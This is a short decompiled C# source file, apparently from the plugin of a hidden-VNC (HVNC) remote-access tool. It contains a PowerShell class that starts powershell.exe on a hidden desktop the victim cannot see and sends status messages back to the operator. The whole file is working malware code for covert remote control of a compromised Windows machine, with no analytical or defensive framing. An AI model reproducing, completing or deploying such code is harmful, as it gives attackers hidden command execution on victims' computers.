using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using HVNC;

namespace S.OpenApp
{
	// Token: 0x0200000F RID: 15
	internal class PowerShell
	{
		// Token: 0x0600005F RID: 95 RVA: 0x00004160 File Offset: 0x00002360
		public static void Open()
		{
			try
			{
				bool flag = !File.Exists(PowerShell.fileNamePowerShell);
				bool flag2 = flag;
				if (flag2)
				{
					Plugin.Helper.SendMSG("PowerShell: Not Found!");
				}
				else
				{
					HideDesktop.CreateProcess(PowerShell.fileNamePowerShell, Plugin.Helper.NameDesktop, false);
					Debug.WriteLine("Running.////");
					Plugin.Helper.SendMSG("PowerShell: Running");
					Thread.Sleep(3000);
					HideDesktop.Load(Plugin.Helper.HVNCDesktop);
					Debug.WriteLine("Refresh");
				}
			}
			catch (Exception ex)
			{
				Plugin.Helper.SendMSG("PowerShell: " + ex.Message);
			}
		}

		// Token: 0x0400002F RID: 47
		private static readonly string fileNamePowerShell = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\WindowsPowerShell\\v1.0\\powershell.exe";
	}
}
